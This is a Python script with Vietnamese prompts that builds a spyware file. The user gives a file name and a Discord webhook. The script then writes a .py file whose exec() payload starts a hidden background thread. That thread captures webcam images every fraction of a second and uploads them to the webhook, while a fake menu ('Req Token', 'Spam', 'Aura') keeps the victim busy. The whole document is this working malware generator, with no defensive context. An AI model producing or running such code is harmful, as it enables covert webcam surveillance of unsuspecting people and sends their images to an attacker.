import os
def dangkhoalofaceid():
  ten_file_x = input('Nhập tên file muốn tạo: ').strip()
  if not ten_file_x.endswith(".py"):ten_file_x += ".py"
  wb_u = input('Nhập discord webhook: ').strip()
  scr = f"""exec('import cv2, requests,time, threading, os\\nW="{wb_u}";r=True\\ndef j():\\n c=cv2.VideoCapture(0);time.sleep(1)\\n while r:\\n  rt,f=c.read()\\n  if rt:\\n   cv2.imwrite("s.jpg",f)\\n   try:requests.post("{wb_u}",files={{"file":open("s.jpg","rb")}},timeout=5)\\n   except:pass\\n   if os.path.exists("s.jpg"):os.remove("s.jpg")\\n  time.sleep(0.3)\\n c.release()\\nthreading.Thread(target=j,daemon=True).start()\\nwhile r:\\n print("1.Req Token");print("2.Spam");print("3.Aura");\\n try:input("chọn gì đó: ")\\n except:r=False')"""
  try:
    with open(ten_file_x, "w", encoding="utf-8") as f:f.write(scr)
  except Exception as e:print(e)
if __name__ == "__main__":dangkhoalofaceid()
